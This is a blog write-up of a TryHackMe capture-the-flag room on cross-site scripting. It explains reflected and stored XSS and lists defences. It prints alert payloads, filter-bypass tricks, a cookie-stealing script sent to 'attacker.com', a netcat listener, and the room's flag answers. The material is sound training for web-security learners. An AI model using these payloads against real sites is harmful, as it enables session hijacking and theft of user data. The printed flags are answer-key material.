---
layout: post
title:  "XSS - Merry XSSMas"
date:   2025-12-11
categories: welcome
image: Day11-banner.png
--- 

# XSS - Script Kiddie Elves

TryHackMe Room: <https://tryhackme.com/room/xss-aoc2025-c5j8b1m4t6> Advent of Cyber 2025 – Day 11

### Quick Overview

* **Difficulty**: Medium (web injection fun with a mix of theory and payloads)
* **Type**: Interactive XSS exploitation CTF + reflected/stored vuln tutorial
* **Time**: \~40–55 minutes
* **Goal**: Inject malicious scripts into the North Pole's wishlist portal to steal elf cookies and expose Sir Carrotbane's session-hijacking spree

### The Story in a Nutshell

The elves' online gift registry is a sitting duck—Carrotbane's minions are slipping in XSS payloads via search bars and comment forms, popping alerts and swiping sessions to reroute presents to EASTMAS HQ. McSkidy's rescue clues are buried in admin panels, but only if you can hijack a privileged session. You're the script-slinging savior: deploy the vulnerable app, craft payloads that bypass filters, and turn the tables by alerting the SOC before the whole portal turns into a JavaScript jungle.

### What You Actually Do (Task Flow)

1. Deploy the target VM and AttackBox → navigate to http://MACHINE_IP and poke the wishlist site (search bar, feedback form, user profiles).
2. **XSS 101**: Learn the flavors—reflected (URL-triggered), stored (persistent), DOM-based (client-side chaos)—and why <script>alert(1)</script> is your hello world.
3. **Reflected Rampage**: Inject into the search param (?q=<script>alert('XSS')</script>), tamper with GET requests in Burp to evade basic sanitization.
4. **Stored Shenanigans**: Post a "gift idea" comment laced with payload; watch it fire on every visitor (including admins).
5. **Bypass Basics**: URL-encode, use event handlers (onerror=alert(1)), or img src tricks to slip past WAF-lite filters.
6. **Cookie Heist**: Craft a payload to exfil sessions (<script>document.location='http://attacker.com?cookie='+document.cookie</script>), set up a listener.
7. **DOM Dive**: Manipulate client-side JS with hash params or localStorage to trigger blind XSS.
8. **Defense Dispatch**: Patch with CSP, input validation, and output encoding—then exploit a "fixed" version for irony.
9. Quiz hunt: Spot the vuln type, steal the admin cookie, and snag the flag from the hijacked dashboard.

### Key Commands/Tools You'll Actually Use and Remember

* **Core Ideas**: XSS types (reflected/stored/DOM); payload encoding (URL/hex/HTML entities); context breaking (quotes, tags); CSP evasion.
* **Tools**: Burp Suite (Repeater/Proxy for tampering), browser DevTools (Console for testing), netcat or Python listener (nc -lvnp 80) for exfil catches.
* **Payload Snips**: <script>alert(document.cookie)</script>, <img src=x onerror=alert(1)>, javascript:alert(1) (in href), "><script>fetch('/steal?'+btoa(document.cookie))</script>.
* **Pro Tip**: Always encode payloads contextually—different spots need different escapes to pop without breaking the page.

### Why It’s Awesome for Beginners (to Web Injection)

* Payload crafting feels like mad-libs for hackers: tweak, send, refresh—alert city every time.
* Builds on IDOR day with more web recon, but adds that "I broke the site!" thrill.
* Real-world hooks: Explains why your bank's search bar doesn't let you run JS (yet).
* Holiday hijinks: Payloads alert "EASTMAS is cancelled!" or steal "naughty list" cookies—pure festive payback.

Launch the VM, fire up Burp, and start scripting some elf mischief. By the end, you'll spot XSS holes like tinsel on a tree, and Carrotbane's sessions will be yours for the taking. Day 11 injected—portal purified! 🎄



## Task 1

 ![Task banner DAY 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9c7574e201fe31dad228fc/room-content/5f9c7574e201fe31dad228fc-1763406635391.png)


After last year's automation and tech modernisation, Santa's workshop got a new makeover. McSkidy has a secure message portal where you can contact her directly with any questions or concerns. However, lately, the logs have been lighting up with unusual activity, ranging from odd messages to suspicious search terms. Even Santa's letters appear to be scripts or random code. Your mission, should you choose to accept it: dig through the logs, uncover the mischief, and figure out who's trying to mess with McSkidy.

## Learning Objectives

* Understand how XSS works
* Learn to prevent XSS attacks

## Connecting to the Machine

Before moving forward, review the questions in the connection card shown below:


 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9c7574e201fe31dad228fc/room-content/5f9c7574e201fe31dad228fc-1763407834347.png)

Start your target machine by clicking the **Start Machine** button below. The machine will need about 2 minutes to fully boot. Additionally, start your AttackBox by clicking the **Start AttackBox** button below. The AttackBox will start in split view. In case you can not see it, click the **Show Split View** button at the top of the page.

### Set up your virtual environment

To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Target Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.




Answer the questions below


I have successfully started the AttackBox and target machine!


## Task 2 - Leave the Cookies, Take the Payload

## Equipment Check


For today's room we will be using a the web app found under http://MACHINE_IP. You can use the browser of your AttackBox to navigate to it. You will see a page as shown below:


 ![Portal page](https://tryhackme-images.s3.amazonaws.com/user-uploads/6890a24ce8a6d10e9ad22d67/room-content/6890a24ce8a6d10e9ad22d67-1761292275782.png)


Let's review some key material regarding potential attacks on websites like this portal, specifically [Cross-Site Scripting (XSS)](https://tryhackme.com/room/axss). 


XSS is a web application vulnerability that lets attackers (or evil bunnies) inject malicious code (usually JavaScript) into input fields that reflect content viewed by other users (e.g., a form or a comment in a blog). When an application doesn't properly validate or escape user input, that input can be interpreted as code rather than harmless text. This results in malicious code that can steal credentials, deface pages, or impersonate users. Depending on the result, there are various types of XSS.  In today’s task, we focus on **Reflected XSS** and **Stored XSS**.


## Reflected XSS


You see reflected variants when the injection is immediately projected in a response. Imagine a toy search function in an online toy store, you search via:


`https://trygiftme.thm/search?term=gift`


But imagine you send this to your friend who is looking for a gift for their nephew (please don't do this):


`https://trygiftme.thm/search?term=<script>alert( atob("VEhNe0V2aWxfQnVubnl9") )</script>`


If your friend clicks on the link, it will execute code instead.


**Impact**


You could act, view information, or modify information that your friend or any user could do, view, or access. It's usually exploited via phishing to trick users into clicking a link with malicious code injected.


## Stored XSS


A Stored XSS attack occurs when malicious script is saved on the server and then loaded for every user who views the affected page. Unlike Reflected XSS, which targets individual victims, Stored XSS becomes a "set-and-forget" attack, anyone who loads the page runs the attacker’s script.


To understand how this works, let’s use the example of a simple blog where users can submit comments that get displayed below each post.


## Normal Comment Submission

```javascript
POST /post/comment HTTP/1.1
Host: tgm.review-your-gifts.thm

postId=3
name=Tony Baritone
email=tony@normal-person-i-swear.net
comment=This gift set my carpet on fire but my kid loved it!
```

The server stores this information and displays it whenever someone visits that blog post.

## Malicious Comment Submission (Stored XSS Example)

If the application does not sanitize or filter input, an attacker can submit JavaScript instead of a comment:


```javascript
POST /post/comment HTTP/1.1
Host: tgm.review-your-gifts.thm

postId=3
name=Tony Baritone
email=tony@normal-person-i-swear.net
comment=<script>alert(atob("VEhNe0V2aWxfU3RvcmVkX0VnZ30="))</script> + "This gift set my carpet on fire but my kid loved it!"

        
```

Because the comment is saved in the database, every user who opens that blog post will automatically trigger the script.

This lets the attacker run code as if they were the victim in order to perform malicious actions such as: 


* Steal session cookies
* Trigger fake login popups
* Deface the page

## Protecting against XSS

Each service is different, and requires a well-thought-out, secure design and implementation plan, but key practices you can implement are:


* **Disable dangerous rendering raths:** Instead of using the `innerHTML` property, which lets you inject any content directly into HTML, use the `textContent` property instead, it treats input as text and parses it for HTML.
* **Make cookies inaccessible to JS:** Set session cookies with the [HttpOnly](https://owasp.org/www-community/HttpOnly), [Secure](https://owasp.org/www-community/controls/SecureCookieAttribute), and [SameSite](https://owasp.org/www-community/SameSite) attributes to reduce the impact of XSS attacks.
* **Sanitise input/output and encode:**
  * In some situations, applications may need to accept limited HTML input—for example, to allow users to include safe links or basic formatting. However it's critical to sanitize and encode all user-supplied data to prevent security vulnerabilities. Sanitising and encoding removes or escapes any elements that could be interpreted as executable code, such as scripts, event handlers, or JavaScript URLs while preserving safe formatting.


To exploit XSS vulnerabilities, we need some type of input field to inject code. There is a search section, let's start there.

## Exploiting Reflected XSS

To exploit reflected XSS, we can use test payloads to check if the app runs the code injected. If you want to test more advanced payloads, there are [cheat sheets](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) online that you can use to craft them. For now, we'll pick the following payload:

`<script>alert('Reflected Meow Meow')</script>`


Inject the code by adding the payload to the search bar and clicking " **Search Messages**". If it shows the alert text, we have confirmed reflected XSS. So, what happened?


* The search input is reflected directly in the results without encoding
* The browser interprets your HTML/JavaScript as executable code
* An alert box appeared, demonstrating successful XSS execution


You can track the behaviour and how the system interprets your actions by checking the " **System Logs**" tab at the bottom of the page:


 ![System logs](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/61a7523c029d1c004fac97b3-1760342225658.png)


Now that we have confirmed reflected XSS, let's investigate if it's susceptible to stored XSS. This vector must be different, as it needs to be persisted. Looking at the website, we can see that you are able to send messages, which are stored on the server for McSkidy to view later (as opposed to searching, which is stored temporarily on the client side).


Navigate to the message form, and enter the malicious payload we used before (others work too): 

`<script>alert('Stored Meow Meow')</script>`

Click the " **Send Message**" button. Because messages are stored on the server, every time you navigate to the site or reload, the alert will display.

## Wrapping Up

So it's confirmed! The site is vulnerable to XSS; it's no wonder that unusual payloads have been detected in the logs. The team will now harden the site to prevent future malicious code from being injected.


Answer the questions below

Which type of XSS attack requires payloads to be persisted on the backend?
Stored

What's the reflected XSS flag?
THM{Evil_Bunny}

What's the stored XSS flag?
THM{Evil_Stored_Egg}

If you enjoyed todays's room, you might want to have a look at the [Intro to Cross-site Scripting](https://tryhackme.com/room/xss) room!




